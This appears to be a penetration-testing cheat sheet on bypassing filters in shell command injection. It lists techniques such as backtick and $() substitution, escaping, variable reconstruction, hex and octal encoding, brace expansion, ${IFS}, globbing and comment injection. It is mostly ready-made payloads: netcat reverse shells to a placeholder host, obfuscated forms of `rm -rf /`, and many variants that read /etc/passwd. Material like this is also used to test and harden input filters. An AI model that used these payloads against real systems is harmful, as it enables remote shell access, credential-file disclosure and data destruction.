# Techniques

1. **Shell command substitution (`` ` ``, `$()`)**

1.1 Empty back ticks

* essentially resolves to empty string, to bypass naive filters
* eg. direct string matching filter: `rm -rf /`&#x20;
  * &#x20;` rm -rf /`` `&#x20;
  * `r``m -rf /`&#x20;

1.2 Execute shell command&#x20;

* execute inline commands similar to how shell substitution works
* eg.  Example vulnerable code: `cat <input> > file`&#x20;
  * Inject: `` `nc x.x.x.x 1234 -e /bin/bash` `` => ``cat `nc x.x.x.x 1234 -e /bin/bash` > file``
  * Inject: `$(nc x.x.x.x 1234 -e /bin/bash)` => `cat $(nc x.x.x.x 1234 -e /bin/bash) > file`

The injection will be able to successfully initiate a netcat reverse shell connection&#x20;



2. **Backslash (`\`)**

* `c\a\t /e\t\c/p\a\s\s\w\d` ⇒ resolves to `cat /etc/passwd`



3. **Variable Expression**

* `a=ca; b=t; $a$b /etc/passwd`&#x20;
  * reconstruct command from variables during runtime
* `a=whoami; $a`&#x20;
  * works to execute the `whoami` command



4. **Encoding**

4.1 URL encoding

* URL encoding can be used to bypass naive filters

4.2 Octal, Hex, Base64 encoding

* The following commands executes `ls`:
  * `$(printf "\154\163")`&#x20;
  * `$(printf "\x6c\x73")`&#x20;
  * `echo -e "\154\163" | bash`
  * `echo -e "\x6c\x73" | bash`



5. **Parameter substitution (, `${}`)**

The following command executes `cat /etc/passwd`

* `cat /etc/pass${x}wd` (given that `x` is not defined as a variable)



6. **Brace expansion (`{}`)**

* The following command executes `cat /etc/passwd`
  * `{cat,/etc/passwd}`&#x20;
* The following command executes `whoami`&#x20;
  * `{whoami,}`&#x20;
  * `{whoami,``}`



7. **Internal-File Separator (IFS - `${IFS}`)**

* To bypass space filters
  * `cat${IFS}/etc/passwd`



7. **Common shell bypass characters**

* Given that the following characters are filtered: semi-colon (`;`), pipe (`|`), double-ampersand (`&&`)
* Possible bypasses
  * newline character (`\n`, `%0a`)



9. **Globbing, wildcard expansion (`?`, `*`)**

* Given that the following commands are filtered:
  * `/bin/cat`
  * `cat /etc/passwd`
* Possible bypass:
  * `/b*n/c*t`&#x20;
  * `/b?n/c?t`&#x20;
  * `cat /etc/passw*d`&#x20;
  * `cat /etc/passw?d`&#x20;



10. **Comment injection (`#`)**

* Example vulnerable code: `cat <input> >> /var/www/log`&#x20;
  * Inject: `; whoami #` ⇒ `cat ; whoami # >> /var/www/log` , the file path `/var/www/log`  will be ignored
  * Or, if the command hangs due to the `cat` command having no arguments, we can attempt to read an invalid file:  `cat x ; whoami # >> /var/www/log`&#x20;
  * Or flush the error for cleaner output:  `cat x 2>/dev/null ; whoami # >> /var/www/log`&#x20;



11. Starting shell command with a backslash

* prevents running an alias, and forces the default binary to run instead
* may be used to bypass security implementations and controls

`curl -x POST` ⇒ `\curl -X POST ...`

{% embed url="https://stackoverflow.com/questions/15691977/why-start-a-shell-command-with-a-backslash" %}

